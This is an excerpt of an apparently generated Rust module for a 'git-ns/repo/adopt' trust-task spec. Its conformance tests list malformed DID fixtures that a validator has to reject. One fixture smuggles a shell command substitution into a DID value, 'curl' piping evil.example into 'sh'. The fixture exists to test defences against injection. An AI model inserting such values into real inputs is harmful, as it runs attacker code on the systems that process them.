...
//!
//! Spec slug: `git-ns/repo/adopt`. Version: `0.2`.
...
/// ```json
///{
///  "$id": "https://trusttasks.org/spec/git-ns/repo/adopt/0.2",
///  "title": "Payload",
...
impl crate::Payload for Payload {
    const TYPE_URI: &'static str = "https://trusttasks.org/spec/git-ns/repo/adopt/0.2";
...
impl crate::Payload for Response {
    const TYPE_URI: &'static str = "https://trusttasks.org/spec/git-ns/repo/adopt/0.2#response";
    const IS_PROOF_REQUIRED: bool = true;
    const IS_ISSUED_AT_REQUIRED: bool = true;
    const IS_RECIPIENT_REQUIRED: bool = true;
    const PAYLOAD_SCHEMA: Option<&'static str> = Some(
...
mod conformance {
    ...
    fn rejects_invalid_examples() {
        ...
        let fixtures: &[(&str, &str)] = &[
            ...
            (
                "Each of `owners` is a DID in the W3C DID Core syntax, whose method-specific id admits only `A-Z a-z 0-9 . - _ :` and percent-encoded octets. `did:[a-z0-9]+:\\S+` let a command substitution through, and a surface that later quoted the value into a shell command ran it.",
                "{\n  \"owners\": [\n    \"did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)\"\n  ],\n  \"resource\": \"github.com/acme/widgets\"\n}",
            ),
            (
                "Each of `owners` is a DID, and a DID has no whitespace in it.",
                "{\n  \"owners\": [\n    \"did:web:acme-vtc.example:bob evil\"\n  ],\n  \"resource\": \"github.com/acme/widgets\"\n}",
            ),
            (
                "Each of `owners` is a bare DID naming a party, not a DID URL: a `#` fragment (a verification-method id) is refused, as are a path and a query.",
                "{\n  \"owners\": [\n    \"did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK#z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK\"\n  ],\n  \"resource\": \"github.com/acme/widgets\"\n}",
            ),
            (
                "Each of `owners` is a DID, whose method name is lowercase letters and digits only; `did:WebVH:` is not `did:webvh:`, and DIDs are compared by exact string.",
